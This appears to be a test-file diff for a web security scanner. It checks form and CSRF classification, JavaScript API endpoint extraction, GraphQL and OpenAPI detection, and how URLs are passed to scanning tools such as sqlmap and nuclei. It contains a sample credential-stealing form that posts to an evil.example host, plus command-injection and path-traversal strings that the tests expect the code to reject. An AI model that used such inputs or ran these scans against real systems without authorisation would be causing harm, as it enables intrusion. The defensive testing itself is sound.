+def test_droopescan_parser_handles_real_droopescan_output():
+    findings = app.parse_droopescan_output(REAL_DROOPESCAN_OUTPUT, "drupal", "http://127.0.0.1:8093/")
+    titles = [f[1] for f in findings]
+    assert "Drupal module/plugin detected: views" in titles and "Drupal module/plugin detected: ctools" in titles and "Drupal theme detected: zen" in titles
+    assert any(t.startswith("Default Drupal file reachable") for t in titles)
+    assert all(f[2].startswith("http://127.0.0.1:8093/") for f in findings)
+
+
+# ---- forms, scripts, APIs and GraphQL (signals.py + analyze_forms_and_apis) -------------------------------
+
+SAMPLE_PAGE = """<html><head><meta name="csrf-token" content="x">
+<script src="/static/main.js"></script><script src="https://cdn.other.example/lib.js"></script><link rel="modulepreload" href="/static/chunk-1.js"></head><body>
+<form action="/login" method="post"><input type="text" name="user"><input type="password" name="pw"></form>
+<form action="http://evil.example/steal" method="post"><input name="email"><input type="password" name="pw"></form>
+<form action="/search"><input type="password" name="q"></form>
+<form action="/register" method="post"><input type="password" name="p1"><input type="password" name="p2"><input type="hidden" name="csrfmiddlewaretoken" value="a"></form>
+<form action="/upload" method="post" enctype="multipart/form-data"><input type="file" name="f"></form>
+<form action="/feedback" method="post"><textarea name="m"></textarea><input type="hidden" name="_token" value="t"></form>
+</body></html>"""
+
+
+def test_forms_are_parsed_and_classified_without_submitting_anything():
+    import signals
+    forms = signals.parse_forms(SAMPLE_PAGE, "https://t.example/start")
+    kinds = [(f["action"], f["method"], f["kind"], f["has_csrf_token"], f["cross_origin"], f["has_file"]) for f in forms]
+    assert kinds[0] == ("https://t.example/login", "post", "login", True, False, False)      # the page-level csrf meta tag counts
+    assert kinds[1][0] == "http://evil.example/steal" and kinds[1][4] is True
+    assert kinds[2][1] == "get" and kinds[2][2] == "login"
+    assert kinds[3][2] == "register" and kinds[3][3] is True
+    assert kinds[4][5] is True and kinds[5][3] is True
+    assert signals.parse_forms("<form><input", "https://t.example/") is not None and signals.parse_forms(None, "https://t.example/") == []
+    no_token = signals.parse_forms('<form action="/l" method="post"><input type="password" name="p"></form>', "https://t.example/")[0]
+    assert no_token["has_csrf_token"] is False
+    assert signals.form_facts(forms) == {"forms": 6, "login_form": True, "register_form": True, "upload_form": True}
+
+
+def test_form_findings_rate_each_weakness_and_never_overstate():
+    import signals
+    forms = signals.parse_forms(SAMPLE_PAGE, "http://t.example/start")
+    findings = {f[1]: f for f in signals.form_findings(forms, "http://t.example/")}
+    assert findings["Login form sends the password over unencrypted HTTP"][0] == "High"          # a non-local host
+    assert findings["Password form submits with GET, so credentials appear in the URL"][0] == "Medium"
+    assert findings["Credentials are posted to a different origin"][0] == "High"
+    assert findings["File upload form found"][0] == "Info" and "not tested" in findings["File upload form found"][3]
+    local = {f[1]: f for f in signals.form_findings(forms, "http://127.0.0.1:1003/")}
+    assert local["Login form sends the password over unencrypted HTTP"][0] == "Low"              # a local lab is not an internet exposure
+    nocsrf = signals.parse_forms('<form action="/l" method="post"><input type="password" name="p"></form>', "https://t.example/")
+    heuristic = signals.form_findings(nocsrf, "https://t.example/")[0]
+    assert heuristic[0] == "Low" and heuristic[5] == "Low" and "heuristic" in heuristic[1].lower()   # labelled as a guess
+    assert signals.form_findings([], "https://t.example/") == []
+
+
+def test_script_urls_are_same_origin_only():
+    import signals
+    urls = signals.script_urls(SAMPLE_PAGE, "http://t.example/start")
+    assert urls == ["http://t.example/static/main.js", "http://t.example/static/chunk-1.js"]       # the CDN script on another origin is dropped
+    assert signals.script_urls(SAMPLE_PAGE, "https://t.example/start")[0] == "https://t.example/static/main.js"
+    assert signals.script_urls('<script src="//other.example/x.js"></script><script src="javascript:1"></script>', "http://t.example/") == []
+    assert signals.script_urls(None, "http://t.example/") == []
+
+
+def test_js_endpoint_extraction_normalises_parameters_and_skips_assets():
+    import signals
+    js = ('a="/rest/products/search?q=";b=`/api/Users/${id}`;c="/api/Cards/:cardId/items";d="/v2/pets/{petId}";e="/graphql";'
+          'f="/assets/x.png";g="/api/avatar.png";h="/apis";i="/api/hello world";j="/api/<script>";k="/rest";l="/api/a//b"')
+    assert signals.extract_js_endpoints(js) == ["/rest/products/search?q=", "/api/Users/1", "/api/Cards/1/items", "/v2/pets/1", "/graphql", "/rest"]
+    assert signals.extract_js_endpoints("") == [] and signals.extract_js_endpoints(None) == []
+    assert len(signals.extract_js_endpoints(";".join(f'"/api/e{i}"' for i in range(200)), limit=10)) == 10
+
+
+def test_openapi_summary_and_graphql_classification():
+    import signals, json
+    spec = json.dumps({"openapi": "3.0.0", "info": {"title": "Shop", "version": "1.2"}, "paths": {
+        "/items": {"get": {"parameters": [{"name": "limit", "in": "query"}, {"name": "id", "in": "path"}]}},
+        "/items/{id}": {"get": {"parameters": [{"name": "expand", "in": "query"}]}},
+        "/health": {"get": {}}, "/admin": {"post": {}}}})
+    summary = signals.openapi_summary(spec, "http://t.example/")
+    assert summary["title"] == "Shop" and summary["path_count"] == 4
+    assert summary["testable_urls"] == ["http://t.example/items?limit=1", "http://t.example/items/1?expand=1"]
+    assert signals.openapi_summary("<html>", "http://t.example/") is None and signals.openapi_summary('{"paths": {}}', "http://t.example/") is None
+    assert signals.classify_graphql('{"data": {"__typename": "Query"}}') == {"graphql": True, "introspection": False}
+    assert signals.classify_graphql('{"data": {"__schema": {"queryType": {"name": "Q"}}}}') == {"graphql": True, "introspection": True}
+    assert signals.classify_graphql('{"errors": [{"message": "Syntax Error: Unexpected Name"}]}')["graphql"] is True
+    assert signals.classify_graphql('{"error": "not found"}') == {"graphql": False, "introspection": False}
+    assert signals.classify_graphql("<html>") == {"graphql": False, "introspection": False}
+
+
+def test_spa_detection_and_framework_paths():
+    import signals
+    assert signals.looks_like_spa("<html></html>", ["angular"], 5) is True
+    shell = '<html><body><div id="root"></div>' + "".join(f'<script src="/s{i}.js"></script>' for i in range(4)) + "</body></html>"
+    assert signals.looks_like_spa(shell, [], 1) is True
+    assert signals.looks_like_spa(shell, [], 9) is False
+    assert signals.looks_like_spa("<html><body>" + "word " * 200 + "</body></html>", [], 1) is False
+    assert "actuator/heapdump" in signals.platform_paths(["springboot"]) and "telescope" in signals.platform_paths(["laravel", "springboot"])
+    assert signals.platform_paths(["angular", "nope"]) == [] and len(signals.platform_paths(list(signals.PLATFORM_PATHS), limit=30)) == 30
+    assert len(signals.platform_paths(["springboot", "springboot"])) == len(set(signals.platform_paths(["springboot"])))
+
+
+@__import__("pytest").fixture(scope="module")
+def api_fixture_server():
+    import json, threading
+    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+    class Handler(BaseHTTPRequestHandler):
+        def log_message(self, *a): pass
+        def reply(self, code, body, ctype="application/json"):
+            self.send_response(code); self.send_header("Content-Type", ctype); self.end_headers(); self.wfile.write(body.encode())
+        def do_GET(self):
+            path, _, query = self.path.partition("?")
+            if path == "/":
+                self.reply(200, '<html><script src="/static/main.js"></script><form action="/login" method="post"><input type="password" name="pw"></form>'
+                                '<form action="/up" method="post" enctype="multipart/form-data"><input type="file" name="f"></form></html>', "text/html")
+            elif path == "/static/main.js":
+                self.reply(200, 'a="/rest/products/search?q=";b="/api/Users/";c="/rest/admin/secret";d="/api/missing";', "application/javascript")
+            elif path == "/swagger.json":
+                self.reply(200, json.dumps({"openapi": "3.0.0", "info": {"title": "Fixture API", "version": "9"}, "paths": {"/items": {"get": {"parameters": [{"name": "limit", "in": "query"}]}}}}))
+            elif path == "/graphql":
+                self.reply(200, '{"data": {"__schema": {"queryType": {"name": "Query"}}}}' if "__schema" in query or "__schema" in self.path else '{"data": {"__typename": "Query"}}')
+            elif path in ("/rest/products/search", "/api/Users/"):
+                self.reply(200, '{"data": [1, 2]}')
+            elif path == "/rest/admin/secret":
+                self.reply(401, '{"error": "login required"}')
+            else:
+                self.reply(404, "not found", "text/plain")
+    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
+    threading.Thread(target=server.serve_forever, daemon=True).start()
+    yield f"http://127.0.0.1:{server.server_address[1]}"
+    server.shutdown()
+
+
+def test_forms_and_api_analysis_against_a_real_local_server(api_fixture_server):
+    base = api_fixture_server
+    html = app.urlopen(base + "/").read().decode()
+    findings, status, extras = app.analyze_forms_and_apis(base, {"urls": [base + "/"]}, html, [], base + "/")
+    titles = {f[1]: f for f in findings}
+    assert status["status"] == "completed" and status["forms"] == 2 and status["js_endpoints"] == 4 and status["api_docs"] == 1 and status["graphql"] == 1
+    assert titles["Login form sends the password over unencrypted HTTP"][0] == "Low"      # loopback fixture
+    assert titles["File upload form found"][0] == "Info"
+    assert titles["API documentation is publicly accessible"][2] == base + "/swagger.json" and "Fixture API" in titles["API documentation is publicly accessible"][3]
+    assert titles["GraphQL endpoint found"][0] == "Info" and titles["GraphQL introspection is enabled"][0] == "Medium"
+    summary_title = next(t for t in titles if t.startswith("API endpoints referenced in JavaScript"))
+    assert "2 answered with data, 1 require authentication" in titles[summary_title][3] and "/api/missing (HTTP 404)" in titles[summary_title][3]
+    assert "API endpoint answers without authentication: /rest/products/search?q=" in titles
+    assert extras["facts"]["login_form"] and extras["facts"]["upload_form"] and extras["facts"]["graphql"] and extras["facts"]["api_requires_auth"]
+    assert sorted(extras["merge_urls"]) == sorted([base + "/rest/products/search?q=", base + "/api/Users/"])
+    assert base + "/items?limit=1" in extras["api_urls"] and base + "/rest/products/search?q=" in extras["api_urls"]
+    assert status["requests"] <= 40
+
+
+def test_forms_and_api_analysis_is_bounded_and_survives_unreachable_hosts(monkeypatch):
+    findings, status, extras = app.analyze_forms_and_apis("http://127.0.0.1:9", {"urls": ["http://127.0.0.1:9/"]},
+                                                           '<script src="/a.js"></script><form><input type="password" name="p"></form>', [], "http://127.0.0.1:9/")
+    assert status["status"] == "completed_with_warnings" and "none of the requests" in status["reason"]
+    assert any(f[1].startswith("Login form") for f in findings)                       # the form analysis needs no network
+    monkeypatch.setattr(app, "FORMS_API_BUDGET_SECONDS", -1)
+    _, status, _ = app.analyze_forms_and_apis("http://127.0.0.1:9", {"urls": []}, '<script src="/a.js"></script>', [], "http://127.0.0.1:9/")
+    assert status["status"] == "completed_with_warnings" and "time budget" in status["reason"] and status["requests"] == 0
+
+
+def test_scan_feeds_api_findings_to_later_stages_and_records_what_cannot_be_tested(monkeypatch):
+    seen = {}
+    def fake_nuclei(target, timeout_seconds=60, targets=None, max_templates=30, platform_tags=None, platform_max=0):
+        seen["nuclei_targets"] = targets
+        return [], {"status": "completed"}
+    def fake_forms_api(target, discovery, html, platform_ids, final_url=None):
+        return ([("Info", "File upload form found", target, "e", "f", "High")], {"status": "completed", "finding_count": 1, "forms": 2, "js_endpoints": 3, "api_docs": 0},
+                {"merge_urls": ["http://api-run.example/rest/products/search?q="], "api_urls": ["http://api-run.example/rest/products/search?q="],
+                 "facts": {"login_form": True, "upload_form": True, "is_spa": True, "graphql": True, "api_requires_auth": True, "api_endpoints": 3}})
+    scan_id, _ = _deep_scan(monkeypatch, ([], {"status": "completed"}), "http://api-run.example/", "<html></html>", nuclei=fake_nuclei, forms_api=fake_forms_api)
+    row, tools, summary = _scan_row(scan_id)
+    assert "http://api-run.example/rest/products/search?q=" in seen["nuclei_targets"]            # endpoints found in scripts get scanned too
+    assert tools["Forms & APIs (built-in)"]["status"] == "completed" and summary["forms_api"]["js_endpoints"] == 3
+    notes = {n["rule"]: n["message"] for n in summary["coverage"]["not_covered"]}
+    assert set(notes) == {"login_testing", "upload_testing", "authenticated_api", "graphql_testing", "spa_crawling"}
+    assert "were not tested" in notes["login_testing"] and "401 or 403" in notes["authenticated_api"] and "single-page app" in notes["spa_crawling"]
+    assert "forms_and_apis" in [p["rule"] for p in summary["coverage"]["planned"]]
+    assert summary["coverage"]["facts"]["login_form"] is True and row["status"] == "completed"   # notes are information, not failures
+
+
+def test_a_failing_forms_and_api_analysis_never_fails_the_scan(monkeypatch):
+    def boom(*a, **k):
+        raise RuntimeError("unexpected")
+    scan_id, _ = _deep_scan(monkeypatch, ([], {"status": "completed"}), "http://boom.example/", "<html></html>", forms_api=boom)
+    row, tools, _ = _scan_row(scan_id)
+    assert row["status"] == "completed_with_gaps" and tools["Forms & APIs (built-in)"]["status"] == "error"
+    assert "analysis failed" in tools["Forms & APIs (built-in)"]["detail"]
+
+
+def test_active_scan_tests_api_urls_found_by_the_analysis(monkeypatch):
+    def fake_forms_api(target, discovery, html, platform_ids, final_url=None):
+        return [], {"status": "completed"}, {"merge_urls": [], "api_urls": ["http://inj-active.example/rest/products/search?q="], "facts": {}}
+    scan_id, calls = _active_scan(monkeypatch, [], forms_api=fake_forms_api)
+    tested = {tool: urls for tool, urls in calls}
+    assert tested["sqlmap"] == tested["dalfox"] and "http://inj-active.example/rest/products/search?q=" in tested["sqlmap"]
+
+
+def test_ffuf_adds_platform_specific_paths_safely(monkeypatch):
+    import json
+    seen = {}
+    monkeypatch.setattr(app.shutil, "which", lambda binary: "/usr/bin/ffuf")
+    class Done: returncode = 0; stdout = ""; stderr = ""
+    def fake_run(command, **kwargs):
+        seen["wordlist"] = app.Path(command[command.index("-w") + 1]).read_text()
+        seen["path"] = command[command.index("-w") + 1]
+        app.Path(command[command.index("-o") + 1]).write_text(json.dumps({"results": []}))
+        return Done()
+    monkeypatch.setattr(app.subprocess, "run", fake_run)
+    app.perform_ffuf_check("http://t.example/", extra_paths=["actuator/heapdump", "telescope", "bad path;rm", "../../etc/passwd x", "admin"])
+    lines = seen["wordlist"].splitlines()
+    assert "actuator/heapdump" in lines and "telescope" in lines and "admin" in lines and lines.count("admin") == 1   # de-duplicated with the base list
+    assert "bad path;rm" not in lines and not any(" " in l for l in lines)                                              # anything odd is dropped
+    assert not seen["path"].endswith("common-paths.txt")
+    app.perform_ffuf_check("http://t.example/")
+    assert seen["path"].endswith("wordlists/common-paths.txt")                                                           # no extras: the original list is used as before
+
+
+def test_nuclei_gets_a_small_useful_url_list_not_every_discovered_file():
+    urls = ["http://t.example", "http://t.example/", "http://t.example/main.js", "http://t.example/styles.css?v=2", "http://t.example/swagger.json",
+            "http://t.example/login", "http://t.example/login?next=/a", "http://t.example/rest/products/search?q=", "http://t.example/rest/products/search?q=x",
+            "http://t.example/api/Users/", "http://t.example/about", "http://t.example/shop", "http://t.example/cart"]
+    chosen = app.nuclei_target_urls("http://t.example", urls, 5)
+    assert chosen[0] == "http://t.example" and len(chosen) == 5
+    assert chosen == ["http://t.example", "http://t.example/login", "http://t.example/rest/products/search?q=", "http://t.example/api/Users/", "http://t.example/about"]
+    assert not any(u.endswith((".js", ".json")) or ".css" in u for u in chosen)
+    assert app.nuclei_target_urls("http://t.example", [], 6) == ["http://t.example"] and app.nuclei_target_urls("http://t.example", None, 6) == ["http://t.example"]
+    assert app.nuclei_target_urls("http://t.example/app", ["http://t.example/app", "http://t.example/app/"], 6) == ["http://t.example/app"]
+
+
+def test_coverage_notes_read_naturally():
+    import planner
+    plan = planner.plan_coverage(planner.Facts(profile="standard", login_form=True, graphql=True), available_tools=set())
+    notes = {n["rule"]: n["message"] for n in plan["not_covered"]}
+    assert notes["login_testing"] == ("A login form was found. Login and authenticated-area testing needs credentialed scanning, which is not available in this version. "
+                                      "Login protection (lockout, brute-force resistance) and every page behind the login were not tested.")
+    assert notes["graphql_testing"].startswith("A GraphQL endpoint was found. Dedicated GraphQL testing needs a GraphQL testing engine, which")
